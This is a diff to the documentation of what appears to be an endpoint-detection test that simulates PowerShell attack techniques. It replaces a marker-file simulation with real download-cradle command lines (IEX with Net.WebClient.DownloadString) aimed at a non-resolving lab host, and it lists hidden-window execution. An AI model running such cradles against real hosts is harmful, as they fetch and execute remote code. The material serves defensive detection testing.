@@ -63,9 +63,9 @@ All patterns are designed to be completely safe - they only create harmless mark
    - Detection: Process creation, command-line arguments
 
 3. **Phase 3: Download Cradle Pattern**
-   - Execute simulated download cradle (creates marker file)
-   - Pattern: `$marker = "..."; $marker | Out-File -FilePath "c:\F0\marker_download.txt"`
-   - Detection: Script content, behavioral analysis
+   - Execute REAL cradle command lines against a reserved-TLD host (`http://cdn-updates.f0rtika-lab.test/p.ps1`) that never resolves
+   - Patterns: `IEX (New-Object Net.WebClient).DownloadString('...')` and `$c = New-Object System.Net.WebClient; $c.DownloadString('...')`
+   - Detection: command-line content, AMSI script scan, DNS attempt telemetry; retrieval failure is expected-benign by design
 
 4. **Phase 4: Hidden Window Execution**
    - Execute: `powershell.exe -WindowStyle Hidden -Command "..."`
@@ -163,10 +163,7 @@ When PowerShell is unavailable:
 
 ### Script Quarantined (Code 105)
 
-If the test binary is quarantined:
-- EDR/AV detected the test binary
-- This indicates signature-based or heuristic detection
-- Test did not fully execute
+Not emitted by this test — there is no quarantine-detection path (no embedded binaries or script files are extracted). Valid exit codes: 126 (protection evidence), 101 (patterns executed), 999 (test error), 102 (timeout).
 
 ## Build Instructions
 
